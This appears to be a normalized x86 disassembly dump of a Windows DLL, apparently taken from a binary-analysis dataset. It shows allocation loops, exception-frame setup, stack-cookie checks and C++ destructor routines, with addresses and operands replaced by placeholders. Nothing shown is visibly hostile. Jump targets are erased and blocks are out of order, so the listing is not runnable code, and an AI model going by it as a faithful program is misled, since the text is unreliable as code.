mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x11
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2e8 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2e4 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x12
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x13
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2e4 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2e0 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x14
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x15
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2e0 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2dc ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x16
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x17
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2dc ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d8 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x18
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x19
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2d8 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d4 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1a
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1b
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2d4 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d0 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1c
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1d
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2d0 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2cc ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1e
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x1f
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2cc ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2c8 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x20
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x21
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2c8 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2c4 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x22
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x23
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2c4 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2c0 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x24
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x25
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2c0 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2bc ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x26
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x27
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2bc ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2b8 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x28
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x29
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2b8 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2b4 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2a
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2b
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2b4 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2b0 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2c
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2d
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2b0 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2ac ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2e
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x2f
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2ac ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2a8 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x30
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x31
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2a8 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2a4 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x32
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x33
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2a4 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2a0 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x34
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x35
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2a0 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x29c ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x36
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x37
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x29c ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x298 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x38
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x39
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x298 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x294 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3a
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3b
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x294 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x290 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3c
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3d
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x290 ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x28c ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3e
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x3f
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x28c ] eax
jmp r-xdata
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
push r--data
call sub_1003c5be
lea eax [ edx + 0x1 ]
inc esi
mov [ edi + 0x24 ] eax
mov eax [ ebp - 0x2f4 ]
mov [ eax + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
mov [ eax ] ecx
cmp esi 0x19
jb r-xdata
xor esi esi
lea esp [ esp ]
mov eax [ ebp + esi * 4 - 0x2ec ]
lea ecx [ ebp - 0x300 ]
mov [ ebp - 0x300 ] eax
mov eax [ edi + 0x20 ]
push ecx
mov [ ebp - 0x2f4 ] eax
push [ eax + 0x4 ]
push eax
call sub_10019c30
mov edx [ edi + 0x24 ]
mov ecx eax
mov eax 0x15555554
sub eax edx
cmp eax 0x1
jb r-xdata
test edi edi
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
add eax edi
mov [ ebp - 0x304 ] eax
mov [ ebp - 0x304 ] edi
jmp r-xdata
lea eax [ edx + 0x1 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
mov [ eax ] ecx
test esi esi
jne r-xdata
mov esi [ ebp - 0x2f8 ]
lea eax [ ebp - 0x304 ]
push eax
mov edi [ esi + 0x10 ]
push [ edi + 0x4 ]
push edi
call sub_10019c30
mov edx [ esi + 0x14 ]
mov ecx eax
mov eax 0x15555554
sub eax edx
cmp eax 0x1
jae r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
xor eax eax
jmp r-xdata
xor ebx ebx
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x41
lea esi [ ebx + 0x4 ]
push 0x0
mov [ ebx ] r--data
push 0x0
mov [ ebp - 0x2fc ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_10019b80
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x40
jmp r-xdata
push 0xc
mov [ ebx + 0x1c ] eax
call sub_1003cdeb
mov ebx eax
add esp 0x4
mov [ ebp - 0x2f0 ] ebx
mov [ ebp - 0x4 ] 0x40
test ebx ebx
je r-xdata
xor edi edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x46
mov [ edi ] r--data
mov [ edi + 0x18 ] 0xf
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x47
lea esi [ edi + 0x20 ]
push 0x0
push 0x0
mov [ ebp - 0x2fc ] esi
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call sub_10019b80
mov [ esi ] eax
mov [ ebp - 0x4 ] 0x4a
mov [ edi + 0x1c ] 0x0
mov [ ebp - 0x4 ] 0x45
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
push 0x28
call sub_1003cdeb
mov edi eax
add esp 0x4
mov [ ebp - 0x2f0 ] edi
mov [ ebp - 0x4 ] 0x45
test edi edi
je r-xdata
mov [ ebp - 0x2f8 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x4b
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2f8 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x7
push 0x4
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
mov eax [ ebp + esi * 4 - 0x2f8 ]
lea ecx [ ebp - 0x2fc ]
mov [ ebp - 0x2fc ] eax
mov eax [ edi + 0x20 ]
push ecx
mov [ ebp - 0x300 ] eax
push [ eax + 0x4 ]
push eax
call sub_10019c30
mov edx [ edi + 0x24 ]
mov ecx eax
mov eax 0x15555554
sub eax edx
cmp eax 0x1
jb r-xdata
xor esi esi
jmp r-xdata
lea eax [ edx + 0x1 ]
inc esi
mov [ edi + 0x24 ] eax
mov eax [ ebp - 0x300 ]
mov [ eax + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
mov [ eax ] ecx
cmp esi 0x1
jb r-xdata
mov [ ebp - 0x2f0 ] edi
lea eax [ ebp - 0x2f0 ]
mov edi [ ebx + 0x4 ]
push eax
push [ edi + 0x4 ]
push edi
call sub_10019c30
mov edx [ ebx + 0x8 ]
mov ecx eax
mov esi 0x15555554
mov eax esi
sub eax edx
cmp eax 0x1
jae r-xdata
lea eax [ edx + 0x1 ]
mov [ ebx + 0x8 ] eax
mov [ edi + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
push 0x4
mov [ eax ] ecx
call sub_1003cdeb
add esp 0x4
mov [ ebp - 0x2f0 ] eax
test eax eax
je r-xdata
push r--data
call sub_1003c5be
mov [ ebp - 0x2f4 ] 0x0
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x4c
mov [ eax ] r--data
mov [ ebp - 0x4 ] 0x7
mov [ ebp - 0x2f4 ] eax
jmp r-xdata
mov esi [ ebp - 0x320 ]
inc eax
mov [ ebx + 0x8 ] eax
mov [ edi + 0x4 ] ecx
mov eax [ ecx + 0x4 ]
mov [ eax ] ecx
mov ecx esi
mov [ esi + 0x20 ] ebx
call sub_1001bf50
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x28 ] 0x10
jb r-xdata
push r--data
call sub_1003c5be
mov edi [ ebx + 0x4 ]
lea eax [ ebp - 0x2f4 ]
push eax
push [ edi + 0x4 ]
push edi
call sub_10019c30
mov ecx eax
mov eax [ ebx + 0x8 ]
sub esi eax
cmp esi 0x1
jae r-xdata
mov [ ebp + 0x28 ] 0xf
mov eax esi
mov [ ebp + 0x24 ] 0x0
mov [ ebp + 0x14 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn 0x24
push [ ebp + 0x14 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bb50
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001bd60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bb80
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ee80
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_1001c630
mov [ ebp - 0x4 ] 0xffffffff
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_1001bbf0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004eeb0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bc50
push ebp
mov ebp esp
push 0xffffffff
push sub_1004eed8
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov [ ecx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_1001bca0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ef08
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bd00
push ebp
mov ebp esp
push 0xffffffff
push sub_1004bff8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0xffffffff
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bd60
push ebp
mov ebp esp
push 0xffffffff
push sub_1004ef74
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov [ edi ] r--data
mov [ ebp - 0x4 ] 0x4
lea ebx [ ebx ]
mov ecx [ edi + 0x20 ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ edi + 0x24 ]
call sub_1001c6b0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov ecx [ edi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ebx [ ecx ]
xor ebx ebx
jmp r-xdata
mov ecx [ edi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
inc [ edi + 0x30 ]
mov [ edi + 0x30 ] 0x0
jmp r-xdata
mov edx [ eax + 0x8 ]
mov eax edx
mov ecx [ ebx + 0x8 ]
and edx 0x3
shr eax 0x2
dec ecx
and ecx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + ecx * 4 ]
mov ecx [ eax + edx * 4 ]
dec [ edi + 0x34 ]
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov [ edi + 0x60 ] r--data
mov [ ebp - 0x4 ] 0x2
cmp [ edi + 0x54 ] 0x10
jb r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov eax [ ecx + 0x4 ]
push 0x1
mov eax [ eax + 0x4 ]
add eax 0x4
add ecx eax
mov eax [ ecx ]
call [ eax ]
jmp r-xdata
test ecx ecx
je r-xdata
mov [ edi + 0x54 ] 0xf
mov [ edi + 0x50 ] 0x0
mov [ edi + 0x40 ] 0x0
mov [ ebp - 0x4 ] 0x1
lea esi [ edi + 0x24 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x6
mov ecx esi
call sub_1001c630
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ edi + 0x18 ] 0x8
jb r-xdata
push [ edi + 0x40 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ edi + 0x34 ] 0x0
je r-xdata
mov [ edi + 0x18 ] 0x7
xor eax eax
mov [ edi + 0x14 ] 0x0
mov [ edi + 0x4 ] ax
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ edi + 0x4 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001bef0
push ebp
mov ebp esp
sub esp 0xc
cmp [ ecx + 0x34 ] 0x0
jne r-xdata
push esi
push edi
lea esi [ ecx + 0x24 ]
lea eax [ ebp - 0xc ]
mov ecx esi
push eax
call sub_1001c6b0
mov edi [ eax ]
test edi edi
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x8 ]
mov ecx edx
mov eax [ edi + 0x8 ]
and edx 0x3
dec eax
shr ecx 0x2
and ecx eax
mov eax [ edi + 0x4 ]
mov eax [ eax + ecx * 4 ]
mov eax [ eax + edx * 4 ]
dec [ esi + 0x10 ]
jne r-xdata
mov edi [ edi ]
inc [ esi + 0xc ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
pop edi
mov [ esi + 0xc ] 0x0
pop esi
mov esp ebp
pop ebp
retn
sub_1001bf50
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004f02c
mov eax [ fs : 0x0 ]
push eax
sub esp 0xa8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xa0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xb8 ]
mov [ fs : 0x0 ] eax
mov esi ecx
push 0x60
call sub_1003cdeb
add esp 0x4
mov [ esp + 0x18 ] eax
mov [ esp + 0xc0 ] 0x0
test eax eax
je r-xdata
xor ebx ebx
sub esp 0x8
mov ecx eax
push [ esi + 0x5c ]
call sub_10018690
mov ebx eax
jmp r-xdata
test ebx ebx
jne r-xdata
call sub_10007160
mov ecx [ esi + 0x38 ]
mov edi eax
test edi edi
je r-xdata
mov [ esp + 0xc0 ] 0xffffffff
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x8 ]
add eax ebx
mov [ esp + 0x18 ] eax
mov [ esp + 0x18 ] ebx
jmp r-xdata
test ecx ecx
je r-xdata
mov edx [ ecx ]
lea eax [ esp + 0x80 ]
push eax
call [ edx + 0x4 ]
mov [ esp + 0xc0 ] 0x1
sub esp 0x18
mov ecx esp
mov [ esp + 0x30 ] esp
lea eax [ esp + 0x98 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xd8 ] 0x2
mov ecx [ esi + 0x38 ]
mov eax [ ecx ]
mov [ esp + 0xd8 ] 0x1
call [ eax + 0x8 ]
lea edx [ esp + 0x80 ]
lea ecx [ esp + 0x20 ]
call sub_1003b670
mov [ esp + 0xc0 ] 0x1
cmp [ esp + 0x34 ] 0x10
jb r-xdata
lea eax [ esp + 0x18 ]
push eax
lea ecx [ esi + 0x24 ]
call sub_1001c5a0
mov ecx [ esp + 0xb8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0xa0 ]
xor ecx esp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov [ esi + 0x38 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x7c ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] 0x0
mov [ esp + 0xc0 ] 0x4
lea eax [ esp + 0x17 ]
push 0x1
push eax
lea ecx [ esp + 0x70 ]
mov [ esp + 0x1f ] 0x0
call sub_10005470
push 0x4
lea eax [ esi + 0x58 ]
push eax
lea ecx [ esp + 0x70 ]
call sub_10005470
push 0xffffffff
push 0x0
lea eax [ esi + 0x40 ]
push eax
lea ecx [ esp + 0x74 ]
call sub_100050b0
sub esp 0x18
lea eax [ esp + 0x80 ]
mov ecx esp
mov [ esp + 0x30 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xd8 ] 0x5
mov eax [ edi ]
mov [ esp + 0xd8 ] 0x4
mov ecx edi
call [ eax + 0x8 ]
test eax eax
je r-xdata
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x64 ] 0xf
mov [ esp + 0x60 ] 0x0
mov [ esp + 0x50 ] 0x0
mov [ esp + 0xc0 ] 0x6
lea eax [ esp + 0x80 ]
push 0xffffffff
push 0x0
mov [ esp + 0x50 ] 0x0
lea ecx [ esp + 0x40 ]
mov [ esp + 0x54 ] 0x0
push eax
mov [ esp + 0x58 ] 0xf
mov [ esp + 0x54 ] 0x0
mov [ esp + 0x44 ] 0x0
call sub_100018b0
mov [ esp + 0xc0 ] 0x7
cmp [ esp + 0x48 ] 0x0
jbe r-xdata
mov [ esi + 0x38 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
lea edx [ esp + 0x50 ]
lea ecx [ esp + 0x20 ]
call sub_1003b670
mov [ esp + 0xc0 ] 0x7
cmp [ esp + 0x34 ] 0x10
jb r-xdata
lea ebx [ ebx ]
mov [ esp + 0x7c ] 0xf
mov [ esp + 0x78 ] 0x0
mov [ esp + 0x68 ] 0x0
mov [ esp + 0xc0 ] 0xffffffff
cmp [ esp + 0x94 ] 0x10
jb r-xdata
push [ esp + 0x68 ]
call j_sub_1003f3e3#2
add esp 0x4
movzx eax [ esi + 0x3c ]
push eax
sub esp 0x18
mov [ esp + 0x50 ] 0xf
mov ecx esp
mov [ esp + 0x38 ] esp
lea eax [ esp + 0x6c ]
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x3c ] 0x0
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xdc ] 0xc
mov [ esp + 0xdc ] 0x7
mov ecx ebx
call sub_100189f0
movzx eax [ esi + 0x3c ]
push eax
sub esp 0x18
lea eax [ esp + 0x9c ]
mov ecx esp
mov [ esp + 0x38 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xdc ] 0xd
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov [ esp + 0xdc ] 0x7
call [ eax + 0x4 ]
movzx eax [ esi + 0x3c ]
push eax
sub esp 0x18
lea eax [ esp + 0x9c ]
mov ecx esp
mov [ esp + 0x38 ] esp
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ esp + 0xdc ] 0xe
mov ecx [ esi + 0x20 ]
mov eax [ ecx ]
mov [ esp + 0xdc ] 0x7
call [ eax + 0x8 ]
mov [ esp + 0xc0 ] 0x6
cmp [ esp + 0x4c ] 0x10
jb r-xdata
push [ esp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0xac ] 0xf
mov [ esp + 0xa8 ] 0x0
mov [ esp + 0x98 ] 0x0
mov [ esp + 0xc0 ] 0x7
cmp [ esp + 0x34 ] 0x10
jb r-xdata
push [ esp + 0x98 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] 0x0
mov [ esp + 0x80 ] 0x0
jmp r-xdata
push [ esp + 0x80 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esp + 0x4c ] 0xf
mov [ esp + 0x48 ] 0x0
mov [ esp + 0x38 ] 0x0
mov [ esp + 0xc0 ] 0x4
cmp [ esp + 0x64 ] 0x10
jb r-xdata
push [ esp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ esp + 0x48 ] 0x0
mov [ esp + 0x34 ] 0xf
mov [ esp + 0x30 ] 0x0
